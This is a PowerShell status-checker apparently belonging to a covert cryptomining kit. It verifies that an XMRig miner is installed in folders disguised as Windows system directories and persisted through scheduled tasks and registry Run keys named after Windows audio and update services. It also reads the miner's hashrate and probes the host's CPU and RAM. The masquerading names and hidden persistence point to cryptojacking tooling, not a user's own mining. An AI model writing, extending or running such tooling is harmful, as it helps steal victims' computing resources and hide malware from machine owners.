param(
    [switch]$Repair
)

function Write-ColoredOutput {
    param([string]$Message, [string]$Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

Write-ColoredOutput "=====================================================" "Cyan"
Write-ColoredOutput "   UNIVERSAL MINER STATUS CHECK - SIMPLE VERSION" "Cyan"
Write-ColoredOutput "=====================================================" "Cyan"

Write-ColoredOutput "`n[1] Checking XMRig Process..." "Yellow"
$processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
if ($processes) {
    Write-ColoredOutput "✓ XMRig is running - PID(s): $($processes.Id -join ', ')" "Green"
} else {
    Write-ColoredOutput "✗ XMRig is NOT running" "Red"
}

Write-ColoredOutput "`n[2] Checking Deployment Locations..." "Yellow"
$locations = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv", 
    "C:\ProgramData\Microsoft\Network\Downloader",
    "C:\ProgramData\WindowsUpdater"
)

$validLocations = 0
foreach ($location in $locations) {
    $xmrigPath = "$location\xmrig.exe"
    $configPath = "$location\config.json"
    
    if ((Test-Path $xmrigPath) -and (Test-Path $configPath)) {
        Write-ColoredOutput "   ✓ $location - Complete installation" "Green"
        $validLocations++
    } elseif (Test-Path $location) {
        Write-ColoredOutput "   ⚠ $location - Partial installation" "Yellow"
    } else {
        Write-ColoredOutput "   ✗ $location - Missing" "Red"
    }
}
Write-ColoredOutput "   Valid locations: $validLocations/$($locations.Count)" "Cyan"

Write-ColoredOutput "`n[3] Checking Scheduled Tasks..." "Yellow"
$taskNames = @("WindowsAudioSrv", "SystemHostAudio", "AudioEndpointSrv", "UniversalMiner", "WindowsAudioService", "BeastModeCC", "WinUpdSvc")
$activeTasks = 0

foreach ($taskName in $taskNames) {
    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($task) {
        $state = $task.State
        if ($state -eq "Ready" -or $state -eq "Running") {
            Write-ColoredOutput "   ✓ $taskName - $state" "Green"
            $activeTasks++
        } else {
            Write-ColoredOutput "   ⚠ $taskName - $state" "Yellow"
        }
    }
}

if ($activeTasks -eq 0) {
    Write-ColoredOutput "✗ No active startup tasks found" "Red"
} else {
    Write-ColoredOutput "✓ $activeTasks active startup tasks found" "Green"
}

Write-ColoredOutput "`n[4] Checking Registry Entries..." "Yellow"
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
)
$regNames = @("UniversalAudioService", "WindowsAudioService", "AudioEndpointBuilder")
$foundEntries = 0

foreach ($regPath in $regPaths) {
    foreach ($regName in $regNames) {
        $value = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        if ($value) {
            Write-ColoredOutput "   ✓ $regPath\$regName" "Green"
            $foundEntries++
        }
    }
}

if ($foundEntries -eq 0) {
    Write-ColoredOutput "✗ No registry startup entries found" "Red"
} else {
    Write-ColoredOutput "✓ $foundEntries registry startup entries found" "Green"
}

Write-ColoredOutput "`n[5] Checking API Connection..." "Yellow"
try {
    $response = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 3 -ErrorAction Stop
    if ($response) {
        $hashrate = 0
        if ($response.hashrate -and $response.hashrate.total) {
            $hashrate = [math]::Round($response.hashrate.total[0], 0)
        }
        Write-ColoredOutput "✓ API accessible - Hashrate: $hashrate H/s" "Green"
    }
} catch {
    Write-ColoredOutput "✗ API not accessible (miner may not be running)" "Yellow"
}

Write-ColoredOutput "`n[6] System Information..." "Yellow"
$memory = Get-WmiObject Win32_ComputerSystem
$totalRAM = [math]::Round($memory.TotalPhysicalMemory / 1GB, 1)
Write-ColoredOutput "✓ Total RAM: $totalRAM GB" "Green"

$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
Write-ColoredOutput "✓ CPU: $($cpu.Name)" "Green"

if ($Repair) {
    Write-ColoredOutput "`n🔧 REPAIR MODE ACTIVATED..." "Green"
    Write-ColoredOutput "This would run repair functions if available" "Yellow"
}

Write-ColoredOutput "`n=====================================================" "Cyan"
Write-ColoredOutput "   STATUS CHECK COMPLETED" "Cyan"
Write-ColoredOutput "=====================================================" "Cyan"

Write-ColoredOutput "`n💡 USAGE:" "Yellow"
Write-ColoredOutput "   • To repair: .\status_checker_simple.ps1 -Repair" "White"
Write-ColoredOutput "   • To start mining: .\UNIVERSAL_LAUNCHER.bat" "White"
Write-ColoredOutput "   • Status only: .\status_checker_simple.ps1" "White"
